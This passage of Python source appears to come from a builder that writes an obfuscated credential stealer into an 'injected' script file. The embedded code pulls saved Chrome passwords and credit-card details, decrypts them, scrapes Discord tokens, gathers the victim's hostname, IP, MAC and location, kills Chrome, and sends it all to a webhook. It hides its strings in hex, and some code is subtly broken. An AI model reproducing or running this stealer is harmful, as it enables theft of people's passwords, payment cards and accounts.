r[1]\\n\\t\\t\\tOOOOOO0000OOO0O = r[4]\\n\\t\\t\\tO0OOOO0O000O0000OOO0O = OOO00OO0OOO0OO0OO(OOOOOO0000OOO0O, O0OOOOOO000O0O00OO)\\n\\t\\t\\tO000OOO0000OOO0O = r[2]\\n\\t\\t\\tO0OOOOOO0000OOO0O = r[3]\\n\\t\\t\\tO0O00OOOO0000OOO0O = (\\\"Name in Card: \\\" + O0OOOO0OOOO0000OOO0O + \\\"Number: \\\" + O0OOOO0O000O0000OOO0O + \\\"Expire Month: \\\" + str(O000OOO0000OOO0O) + \\\"Expire Year: \\\" + str(O0OOOOOO0000OOO0O) + \\\"----------------------------------------------------\\\")\\n\\t\\t\\tO00O00O00OOO0O00O = json.dumps({bytes.fromhex(\"636f6e74656e74\").decode(\\\'utf-8\\\'): O0O00OOOO0000OOO0O})\\n\\t\\t\\treq = Request(webhook, data=O00O00O00OOO0O00O.encode(), headers=headers)\\n\\t\\t\\turlopen(req)\\n\\t\\t\\treq = Request(O00O00OO00OO00OOO0, data=O00O00O00OOO0O00O.encode(), headers=headers)\\n\\t\\t\\turlopen(req)\\n\\texcept Exception as e:\\n\\t\\tpass\\n\\t\\tcursor.close()\\n\\t\\tconn.close()\\n\\t\\ttry:\\n\\t\\t\\tos.remove(\"CCvault.db\")\\n\\t\\texcept Exception as e:\\n\\t\\t\\tpass\\ndef decrypt(OOOO0000OO00OO000, payload):\\n\\treturn OOOO0000OO00OO000.decrypt(payload)\\ndef OOO00OO0OOO0000O0(aes_key, iv):\\n\\treturn RSA.new(aes_key, RSA.MODE_GCM, iv)\\ndef OOO00OO0OOO0OO0OO(buff, O0OOOOOO000O0O00OO):\\n\\ttry:\\n\\t\\tiv = buff[3:15]\\n\\t\\tpayload = buff[15:]\\n\\t\\tcipher = OOO00OO0OOO0000O0(O0OOOOOO000O0O00OO, iv)\\n\\t\\tdecrypted_pass = decrypt(cipher, payload)\\n\\t\\tdecrypted_pass = decrypted_pass[:-16].decode()\\n\\t\\treturn decrypted_pass\\n\\texcept Exception as e:\\n\\t\\tpass\\ndef O0OOO00O0O0O0OO0O0O(OO0O0OOO0000OOO00):\\n\\tOO0O0OOO0000OOO00 += \\\'\\\\Local Storage\\\\leveldb\\\'\\n\\tOOO00O0O0O000OO00 = []\\n\\tfor OO00OO00OO00OOO00 in os.listdir(OO0O0OOO0000OOO00):\\n\\t\\tif not OO00OO00OO00OOO00.endswith(bytes.fromhex(\\\"2e6c6f67\\\").decode(\\\'utf-8\\\')) and not OO00OO00OO00OOO00.endswith(bytes.fromhex(\\\"2e6c6462\\\").decode(\\\'utf-8\\\')):\\n\\t\\t\\tcontinue\\n\\t\\tfor O0O0O00O0OO0OOO0O in [OO0OOOO0O0OO0O00O.strip() for OO0OOOO0O0OO0O00O in open(f\\\'{OO0O0OOO0000OOO00}\\\\{OO00OO00OO00OOO00}\\\',errors=\\\'ignore\\\').readlines() if OO0OOOO0O0OO0O00O.strip()]:\\n\\t\\t\\tfor OO0O0000000OO000O in (r\\\'[\w-]{24}\.[\w-]{6}\.[\w-]{27}\\\',r\\\'mfa\.[\w-]{84}\\\'):\\n\\t\\t\\t\\tfor OOO0O00O0OOOOO0O0 in re.findall(OO0O0000000OO000O, O0O0O00O0OO0OOO0O):\\n\\t\\t\\t\\t\\tOOO00O0O0O000OO00.append(OOO0O00O0OOOOO0O0)\\n\\t\\t\\t\\t\\treturn OOO00O0O0O000OO00\\ndef main():\\n\\tOOO0000OOO0OO00OO = os.getenv(\\\'LOCALAPPDATA\\\')\\n\\tO000O0O0OOOOO0O0O = os.getenv(\\\'APPDATA\\\')\\n\\tO0000OO0O0O0O0O0O = {\\\'Discord\\\': O000O0O0OOOOO0O0O + \\\'\\\\\\\\Discord\\\',\\\'Discord Canary\\\': O000O0O0OOOOO0O0O +\\\'\\\\\\\\discordcanary\\\',\\\'Discord PTB\\\': O000O0O0OOOOO0O0O +\\\'\\\\\\\\discordptb\\\',\\\'Google Chrome\\\':OOO0000OOO0OO00OO + \\\'\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\User Data\\\\\\\\Default\\\',\\\'Opera\\\':O000O0O0OOOOO0O0O + \\\'\\Opera Software\\\\\\\\Opera Stable\\\',\\\'Brave\\\': OOO0000OOO0OO00OO + \\\'\\\\\\\\BraveSoftware\\\\\\\\Brave-Browser\\\\\\\\User Data\\\\\\\\Default\\\',\\\'Yandex\\\':OOO0000OOO0OO00OO +\\\'\\\\\\\\Yandex\\\\\\\\YandexBrowser\\\\\\\\User Data\\\\\\\\Default\\\'}\\n\\tmessage = \\\'@everyone\\\' if everyone else \\\'\\\'\\n\\tfor O0O0OOOOOOOOO0O0O, O0OOO0000OO0OOO0O in O0000OO0O0O0O0O0O.items():\\n\\t\\tif not os.path.exists(O0OOO0000OO0OOO0O):\\n\\t\\t\\tcontinue\\n\\t\\tmessage += f\\\'\\\\n**{O0O0OOOOOOOOO0O0O}**\\\\n\\\'\\n\\t\\tmessage += \\\'Computer Name is: \\\'  +OO0O000O000OO00O00 + \\\'\\\\n\\\'\\n\\t\\tmessage += \\\'Computer IP Address is: \\\'  + OO0O000O000OO00O0 + \\\'\\\\n\\\'\\n\\t\\t\\n\\t\\tmessage += \\\'Mac Address: \\\'  + gma() + \\\'\\\\n\\\'message += \\\'Victim\\\\\\'s IP details: \\\'+ \\\'\\\\n\\\'\\n\\t\\tmessage += \\\'IP : \\\'  + ip + \\\'\\\\n\\\' + \\\'Region : \\\' + region + \\\'\\\\n\\\' + \\\'Country: \\\' + country + \\'\\\\n\\\' + \\\'City: \\\' + city + \\\'\\\\n\\\' + \\\'Org: \\\' + org + \\\'\\\\n\\\'\\n\\t\\tPopen(\\\'taskkill /F /IM chrome.exe\\\')\\n\\t\\twhile(True):\\n\\t\\t\\ttry:\\n\\t\\t\\t\\tmessage += \\\'All Tokens are: \\\' +\\\'\\\\n\\\'\\n\\t\\t\\t\\tmessage += \\\'Extracted Tokens: \\\'+ \\\"\\\\n\\\"\\n\\t\\t\\t\\tdata1=os.path.expanduser(\\\'~\\\')+\\\'\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\User Data\\\\\\\\Default\\\\\\\\Login Data\\\'\\n\\t\\t\\t\\tconnection = sqlite3.connect(data1)\\n\\t\\t\\t\\tprint (\\\'[>]Connected to data base..\\\')\\n\\t\\t\\t\\tcursor = connection.cursor()\\n\\t\\t\\t\\tcursor.execute(\\\'SELECT action_url, username_value, password_value FROM logins\\\')\\n\\t\\t\\t\\tfinal_data=cursor.fetchall()\\n\\t\\t\\t\\tprint (\\\'[>]Found\\\'+str(len(final_data))+\\\'password..\\\')\\n\\t\\t\\t\\tO0O000OOO0OO0O0O0 = \\\'@everyone\\\' if everyone else \\\'\\\'\\n\\t\\t\\t\\tfor website_data in final_data:\\n\\t\\t\\t\\t\\ttry:\\n\\t\\t\\t\\t\\t\\tpassword = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]\\n\\t\\t\\t\\t\\t\\tif(website_data[0] != \\\"\\\" and website_data[1] != \\\"\\\"):\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\'Website: \\\'+\\\'\\\\n\\\'+\\\'<\\\'+str(website_data[0]) + \\\'>\\\'+\\\"\\\\n\\\"\\n\\t\\t\\t\\t\\t\\tif(website_data[1] != \\\"\\\" and website_data[0] != \\\"\\\"):\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\'Username: \\\'+str(website_data[1]) + \\\"\\\\n\\\"\\n\\t\\t\\t\\t\\t\\tif(website_data[0] != \\\"\\\" and website_data[1] != \\\"\\\"):\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\'Password: \\\'+str(password) + \\\"\\\\n\\\"\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\"\\\\n----------------------------------------------------\\\\n\\\"\\n\\t\\t\\t\\t\\texcept:\\n\\t\\t\\t\\t\\t\\t\\tpass\\n\\t\\t\\t\\tpayload = json.dumps({\\\'content\\\': O0O000OOO0OO0O0O0})\\n\\t\\t\\t\\theaders = {\\\'Content-Type\\\':\\\'application/json\\\',\\\'User-Agent\\\': \\\'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\\\'}\\n\\t\\t\\t\\tprint (\\\'[>]Decrypted\\\' +str(len(final_data))+\\\'passwords..\\\')\\n\\t\\t\\t\\tprint(message)\\n\\t\\t\\t\\tbreak\\n\\t\\t\\texcept:\\n\\t\\t\\t\\t\\t\\tpass\\n\\t\\tOO0OOO0O0000O0O00 = O0OOO00O0O0O0OO0O0O(O0OOO0000OO0OOO0O)\\n\\t\\ti = 0\\n\\t\\ttry:\\n\\t\\t\\tif len(OO0OOO0O0000O0O00) > 0:\\n\\t\\t\\t\\t\\t\\tfor O0O0O0OO0OO0000O0 in OO0OOO0O0000O0O00:\\n\\t\\t\\t\\t\\t\\t\\ti = i + 1\\n\\t\\t\\t\\t\\t\\t\\tmessage += \\\'----**\\\'+\\\'token\\\'+ f\\\'{i}\\\' +\\\'**----\\\\n\\\'\\n\\t\\t\\t\\t\\t\\t\\tmessage += O0O0O0OO0OO0000O0 + \\\'\\\\n\\\'\\n\\t\\t\\t\\t\\t\\telse:\\n\\t\\t\\t\\t\\t\\t\\tmessage += \\\'No tokens Found\\\' + \\\'\\\\n\\\'\\n\\t\\t\\t\\t\\t\\tmessage += \\\'\\\\n\\\'\\n\\t\\texcept:\\n\\t\\t\\tprint(\\\'No tokens\\\')\\n\\tO00000O0O000O0000 = {\\n\\t\\tbytes.fromhex(\\\"436f6e74656e742d54797065\\\").decode(\\\'utf-8\\\'):\\n\\t\\t\\tbytes.fromhex(\"6170706c69636174696f6e2f6a736f6e\").decode(\\\'utf-8\\\'),\\n\\t\\t\\tbytes.fromhex(\\\"557365722d4167656e74\\\").decode(\\\'utf-8\\\'):\\n\\t\\t\\tbytes.fromhex(\\\"4d6f7a696c6c612f352e3020285831313b204c696e7578207838365f363429204170706c655765624b69742f3533372e313120284b48544d4c2c206c696b65204765636b6f29204368726f6d652f32332e302e313237312e3634205361666172692f3533372e3131\\\").decode(\\\'utf-8\\\')}\\n\\tOO0O00000O0O0O00O = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): message})\\n\\tO00OO0000O0O0O000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d437265646974204361726420496e666f726d6174696f6e3a2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\tO00O00000O0O0O000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d426f6f6b6d61726b733a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\tO00O0000OO0O0O000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d56696374696d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\tO00O0000OO0O0O0O0 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\ttry:\\n\\t\\tOOOO0O000O000O0O0 = Request(webhook,data=O00O0000OO0O0O000.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000O0O0)\\n\\t\\tOOOO0O000O000O0O0 = Request(O00O00OO00OO00OOO0,data=O00O0000OO0O0O000.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000O0O0)\\n\\t\\tOOOO0O000O000OOO0 = Request(webhook,data=OO0O00000O0O0O00O.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000OOO0)\\n\\t\\tOOOO0O000O000OOO0 = Request(O00O00OO00OO00OOO0,data=OO0O00000O0O0O00O.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000OOO0)\\n\\t\\treq = Request(webhook, data=payload.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\treq = Request(O00O00OO00OO00OOO0, data=payload.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\treq = Request(webhook, data=O00OO0000O0O0O000.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\treq = Request(O00O00OO00OO00OOO0, data=O00OO0000O0O0O000.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\tif(getcredit == 1):\\n\\t\\t\\tO0O0OOO0000OOOOOO0O()\\n\\t\\tif(gebook == 1):\\n\\t\\t\\tOO000OOO0OO0O(O00O0000OO0O0O0O0,O00000O0O000O0000)\\n\\texcept:\\n\\t\\tprint(\\\'Error\\\')\')\n\telse:\n\t\tf.write('everyone = False\\nOO0O000O000OO00O00 = socket.gethostname()\\nOO0O000O000OO00O0 = socket.gethostbyname(OO0O000O000OO00O00)\\ndef ConvertDate(ft):\\n\\tutc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)\\n\\treturn utc.strftime(\\\'%Y-%m-%d %H:%M:%S\\\')\\ndef O0O00OO000O0O00OO():\\n\\ttry:\\n\\t\\twith open(os.environ[\\\'USERPROFILE\\\'] + os.sep + r\\\'AppData\\\\Local\\\\Google\\\\\Chrome\\\\User Data\\\\Local State\\\',\\\"r\\\", encoding=\\\'utf-8\\\') as f:\\n\\t\\t\\tO0OOOOO0000OOOOOOOOO = f.read()\\n\\t\\t\\tO0OOOOO0000OOOOOOOOO = json.loads(O0OOOOO0000OOOOOOOOO)\\n\\texcept:\\n\\t\\texit()\\n\\tO0OOOOOO000O0O00OO = base64.b64decode(O0OOOOO0000OOOOOOOOO[bytes.fromhex(\\\'6f735f6372797074\\\').decode(\\\'utf-8\\\')][bytes.fromhex(\\\'656e637279707465645f6b6579\\\').decode(\\\'utf-8\\\')])\\n\\tO0OOOOOO000O0O00OO = O0OOOOOO000O0O00OO[5:]\\n\\tO0OOOOOO000O0O00OO = win32crypt.CryptUnprotectData(O0OOOOOO000O0O00OO, None, None, None, 0)[1]\\n\\treturn O0OOOOOO000O0O00OO\\nheaders = {\\\'Content-Type\\\': \\\'application/json\\\',\\\'User-Agent\\\': \\\'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\\\'}\\n\\n\\ndef O0O0OOO0000OOOOOO0O():\\n\\tO0OOOOOO000O0O00OO = O0O00OO000O0O00OO()\\n\\tlogin_db = os.environ[bytes.fromhex(\\\'5553455250524f46494c45\\\').decode(\\\'utf-8\\\')] + os.sep + r\\\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Web Data\\\'\\n\\tshutil.copy2(login_db,\\\"CCvault.db\\\")\\n\\tconn = sqlite3.connect(\\\"CCvault.db\\\")\\n\\tcursor = conn.cursor()\\n\\ttry:\\n\\t\\tcursor.execute(\\\"SELECT * FROM credit_cards\\\")\\n\\t\\tfor r in cursor.fetchall():\\n\\t\\t\\tO0OOOO0OOOO0000OOO0O = r[1]\\n\\t\\t\\tOOOOOO0000OOO0O = r[4]\\n\\t\\t\\tO0OOOO0O000O0000OOO0O = OOO00OO0OOO0OO0OO(OOOOOO0000OOO0O, O0OOOOOO000O0O00OO)\\n\\t\\t\\tO000OOO0000OOO0O = r[2]\\n\\t\\t\\tO0OOOOOO0000OOO0O = r[3]\\n\\t\\t\\tO0O00OOOO0000OOO0O = (\\\"Name in Card: \\\" + O0OOOO0OOOO0000OOO0O + \\\"Number: \\\" + O0OOOO0O000O0000OOO0O + \\\"Expire Month: \\\" + str(O000OOO0000OOO0O) + \\\"Expire Year: \\\" + str(O0OOOOOO0000OOO0O) + \\\"----------------------------------------------------\\\")\\n\\t\\t\\tO00O00O00OOO0O00O = json.dumps({bytes.fromhex(\"636f6e74656e74\").decode(\\\'utf-8\\\'): O0O00OOOO0000OOO0O})\\n\\t\\t\\treq = Request(webhook, data=O00O00O00OOO0O00O.encode(), headers=headers)\\n\\t\\t\\turlopen(req)\\n\\t\\t\\treq = Request(O00O00OO00OO00OOO0, data=O00O00O00OOO0O00O.encode(), headers=headers)\\n\\t\\t\\turlopen(req)\\n\\texcept Exception as e:\\n\\t\\tpass\\n\\t\\tcursor.close()\\n\\t\\tconn.close()\\n\\t\\ttry:\\n\\t\\t\\tos.remove(\"CCvault.db\")\\n\\t\\texcept Exception as e:\\n\\t\\t\\tpass\\ndef decrypt(OOOO0000OO00OO000, payload):\\n\\treturn OOOO0000OO00OO000.decrypt(payload)\\ndef OOO00OO0OOO0000O0(aes_key, iv):\\n\\treturn RSA.new(aes_key, RSA.MODE_GCM, iv)\\ndef OOO00OO0OOO0OO0OO(buff, O0OOOOOO000O0O00OO):\\n\\ttry:\\n\\t\\tiv = buff[3:15]\\n\\t\\tpayload = buff[15:]\\n\\t\\tcipher = OOO00OO0OOO0000O0(O0OOOOOO000O0O00OO, iv)\\n\\t\\tdecrypted_pass = decrypt(cipher, payload)\\n\\t\\tdecrypted_pass = decrypted_pass[:-16].decode()\\n\\t\\treturn decrypted_pass\\n\\texcept Exception as e:\\n\\t\\tpass\\ndef O0OOO00O0O0O0OO0O0O(OO0O0OOO0000OOO00):\\n\\tOO0O0OOO0000OOO00 += \\\'\\\\Local Storage\\\\leveldb\\\'\\n\\tOOO00O0O0O000OO00 = []\\n\\tfor OO00OO00OO00OOO00 in os.listdir(OO0O0OOO0000OOO00):\\n\\t\\tif not OO00OO00OO00OOO00.endswith(bytes.fromhex(\\\"2e6c6f67\\\").decode(\\\'utf-8\\\')) and not OO00OO00OO00OOO00.endswith(bytes.fromhex(\\\"2e6c6462\\\").decode(\\\'utf-8\\\')):\\n\\t\\t\\tcontinue\\n\\t\\tfor O0O0O00O0OO0OOO0O in [OO0OOOO0O0OO0O00O.strip() for OO0OOOO0O0OO0O00O in open(f\\\'{OO0O0OOO0000OOO00}\\\\{OO00OO00OO00OOO00}\\\',errors=\\\'ignore\\\').readlines() if OO0OOOO0O0OO0O00O.strip()]:\\n\\t\\t\\tfor OO0O0000000OO000O in (r\\\'[\w-]{24}\.[\w-]{6}\.[\w-]{27}\\\',r\\\'mfa\.[\w-]{84}\\\'):\\n\\t\\t\\t\\tfor OOO0O00O0OOOOO0O0 in re.findall(OO0O0000000OO000O, O0O0O00O0OO0OOO0O):\\n\\t\\t\\t\\t\\tOOO00O0O0O000OO00.append(OOO0O00O0OOOOO0O0)\\n\\t\\t\\t\\t\\treturn OOO00O0O0O000OO00\\ndef main():\\n\\tOOO0000OOO0OO00OO = os.getenv(\\\'LOCALAPPDATA\\\')\\n\\tO000O0O0OOOOO0O0O = os.getenv(\\\'APPDATA\\\')\\n\\tO0000OO0O0O0O0O0O = {\\\'Discord\\\': O000O0O0OOOOO0O0O + \\\'\\\\\\\\Discord\\\',\\\'Discord Canary\\\': O000O0O0OOOOO0O0O +\\\'\\\\\\\\discordcanary\\\',\\\'Discord PTB\\\': O000O0O0OOOOO0O0O +\\\'\\\\\\\\discordptb\\\',\\\'Google Chrome\\\':OOO0000OOO0OO00OO + \\\'\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\User Data\\\\\\\\Default\\\',\\\'Opera\\\':O000O0O0OOOOO0O0O + \\\'\\Opera Software\\\\\\\\Opera Stable\\\',\\\'Brave\\\': OOO0000OOO0OO00OO + \\\'\\\\\\\\BraveSoftware\\\\\\\\Brave-Browser\\\\\\\\User Data\\\\\\\\Default\\\',\\\'Yandex\\\':OOO0000OOO0OO00OO +\\\'\\\\\\\\Yandex\\\\\\\\YandexBrowser\\\\\\\\User Data\\\\\\\\Default\\\'}\\n\\tmessage = \\\'@everyone\\\' if everyone else \\\'\\\'\\n\\tfor O0O0OOOOOOOOO0O0O, O0OOO0000OO0OOO0O in O0000OO0O0O0O0O0O.items():\\n\\t\\tif not os.path.exists(O0OOO0000OO0OOO0O):\\n\\t\\t\\tcontinue\\n\\t\\tmessage += f\\\'\\\\n**{O0O0OOOOOOOOO0O0O}**\\\\n\\\'\\n\\t\\tmessage += \\\'Computer Name is: \\\'  +OO0O000O000OO00O00 + \\\'\\\\n\\\'\\n\\t\\tmessage += \\\'Computer IP Address is: \\\'  + OO0O000O000OO00O0 + \\\'\\\\n\\\'\\n\\t\\tmessage += \\\'Mac Address: \\\'  + gma() + \\\'\\\\n\\\'\\n\\t\\tmessage += \\\'Victim\\\\\\\'s IP details: \\\'+ \\\'\\\\n\\\'\\n\\t\\tmessage += \\\'IP : \\\'  + ip + \\\'\\\\n\\\' + \\\'Region : \\\' + region + \\\'\\\\n\\\' + \\\'Country: \\\' + country + \\'\\\\n\\\' + \\\'City: \\\' + city + \\\'\\\\n\\\' + \\\'Org: \\\' + org + \\\'\\\\n\\\'\\n\\t\\tPopen(\\\'taskkill /F /IM chrome.exe\\\')\\n\\t\\twhile(True):\\n\\t\\t\\ttry:\\n\\t\\t\\t\\tmessage += \\\'All Tokens are: \\\' +\\\'\\\\n\\\'\\n\\t\\t\\t\\tmessage += \\\'Extracted Tokens: \\\'+ \\\"\\\\n\\\"\\n\\t\\t\\t\\tdata1=os.path.expanduser(\\\'~\\\')+\\\'\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\User Data\\\\\\\\Default\\\\\\\\Login Data\\\'\\n\\t\\t\\t\\tconnection = sqlite3.connect(data1)\\n\\t\\t\\t\\tprint (\\\'[>]Connected to data base..\\\')\\n\\t\\t\\t\\tcursor = connection.cursor()\\n\\t\\t\\t\\tcursor.execute(\\\'SELECT action_url, username_value, password_value FROM logins\\\')\\n\\t\\t\\t\\tfinal_data=cursor.fetchall()\\n\\t\\t\\t\\tprint (\\\'[>]Found\\\'+str(len(final_data))+\\\'password..\\\')\\n\\t\\t\\t\\tO0O000OOO0OO0O0O0 = \\\'@everyone\\\' if everyone else \\\'\\\'\\n\\t\\t\\t\\tfor website_data in final_data:\\n\\t\\t\\t\\t\\ttry:\\n\\t\\t\\t\\t\\t\\tpassword = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]\\n\\t\\t\\t\\t\\t\\tif(website_data[0] != \\\"\\\" and website_data[1] != \\\"\\\"):\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\'Website: \\\'+\\\'\\\\n\\\'+\\\'<\\\'+str(website_data[0]) + \\\'>\\\'+\\\"\\\\n\\\"\\n\\t\\t\\t\\t\\t\\tif(website_data[1] != \\\"\\\" and website_data[0] != \\\"\\\"):\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\'Username: \\\'+str(website_data[1]) + \\\"\\\\n\\\"\\n\\t\\t\\t\\t\\t\\tif(website_data[0] != \\\"\\\" and website_data[1] != \\\"\\\"):\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\'Password: \\\'+str(password) + \\\"\\\\n\\\"\\n\\t\\t\\t\\t\\t\\t\\tO0O000OOO0OO0O0O0+=\\\"\\\\n----------------------------------------------------\\\\n\\\"\\n\\t\\t\\t\\t\\texcept:\\n\\t\\t\\t\\t\\t\\t\\tpass\\n\\t\\t\\t\\tpayload = json.dumps({\\\'content\\\': O0O000OOO0OO0O0O0})\\n\\t\\t\\t\\theaders = {\\\'Content-Type\\\':\\\'application/json\\\',\\\'User-Agent\\\': \\\'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\\\'}\\n\\t\\t\\t\\tprint (\\\'[>]Decrypted\\\' +str(len(final_data))+\\\'passwords..\\\')\\n\\t\\t\\t\\tprint(message)\\n\\t\\t\\t\\tbreak\\n\\t\\t\\texcept:\\n\\t\\t\\t\\t\\t\\tpass\\n\\t\\tOO0OOO0O0000O0O00 = O0OOO00O0O0O0OO0O0O(O0OOO0000OO0OOO0O)\\n\\t\\ti = 0\\n\\t\\ttry:\\n\\t\\t\\tif len(OO0OOO0O0000O0O00) > 0:\\n\\t\\t\\t\\t\\t\\tfor O0O0O0OO0OO0000O0 in OO0OOO0O0000O0O00:\\n\\t\\t\\t\\t\\t\\t\\ti = i + 1\\n\\t\\t\\t\\t\\t\\t\\tmessage += \\\'----**\\\'+\\\'token\\\'+ f\\\'{i}\\\' +\\\'**----\\\\n\\\'\\n\\t\\t\\t\\t\\t\\t\\tmessage += O0O0O0OO0OO0000O0 + \\\'\\\\n\\\'\\n\\t\\t\\t\\t\\t\\telse:\\n\\t\\t\\t\\t\\t\\t\\tmessage += \\\'No tokens Found\\\' + \\\'\\\\n\\\'\\n\\t\\t\\t\\t\\t\\tmessage += \\\'\\\\n\\\'\\n\\t\\texcept:\\n\\t\\t\\tprint(\\\'No tokens\\\')\\n\\tO00000O0O000O0000 = {\\n\\t\\tbytes.fromhex(\\\"436f6e74656e742d54797065\\\").decode(\\\'utf-8\\\'):\\n\\t\\t\\tbytes.fromhex(\"6170706c69636174696f6e2f6a736f6e\").decode(\\\'utf-8\\\'),\\n\\t\\t\\tbytes.fromhex(\\\"557365722d4167656e74\\\").decode(\\\'utf-8\\\'):\\n\\t\\t\\tbytes.fromhex(\\\"4d6f7a696c6c612f352e3020285831313b204c696e7578207838365f363429204170706c655765624b69742f3533372e313120284b48544d4c2c206c696b65204765636b6f29204368726f6d652f32332e302e313237312e3634205361666172692f3533372e3131\\\").decode(\\\'utf-8\\\')}\\n\\tOO0O00000O0O0O00O = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): message})\\n\\tO00OO0000O0O0O000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d437265646974204361726420496e666f726d6174696f6e3a2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\tO00O00000O0O0O000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d426f6f6b6d61726b733a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\tO00O0000OO0O0O000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d56696374696d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\tO00O0000OO0O0O0O0 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bytes.fromhex(\\\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\\\").decode(\\\'utf-8\\\')})\\n\\ttry:\\n\\t\\tOOOO0O000O000O0O0 = Request(webhook,data=O00O0000OO0O0O000.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000O0O0)\\n\\t\\tOOOO0O000O000O0O0 = Request(O00O00OO00OO00OOO0,data=O00O0000OO0O0O000.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000O0O0)\\n\\t\\tOOOO0O000O000OOO0 = Request(webhook,data=OO0O00000O0O0O00O.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000OOO0)\\n\\t\\tOOOO0O000O000OOO0 = Request(O00O00OO00OO00OOO0,data=OO0O00000O0O0O00O.encode(),headers=O00000O0O000O0000)\\n\\t\\turlopen(OOOO0O000O000OOO0)\\n\\t\\treq = Request(webhook, data=payload.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\treq = Request(O00O00OO00OO00OOO0, data=payload.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\treq = Request(webhook, data=O00OO0000O0O0O000.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\treq = Request(O00O00OO00OO00OOO0, data=O00OO0000O0O0O000.encode(), headers=headers)\\n\\t\\turlopen(req)\\n\\t\\tif(getcredit == 1):\\n\\t\\t\\tO0O0OOO0000OOOOOO0O()\\n\\texcept:\\n\\t\\tprint(\\\'Error\\\')\')")
  if(message == True):
    f.write(f'\nwith open(\"injected{filename}.py\", \"a\") as O00O00OOO00OOO:\n\tO00O00OOO00OOO.write(f\'\\nos.system(\\\'mshta vbscript:Execute(\\\"msgbox ""{messageString}"":close")\\\')\')')
  if(everyone == 1):
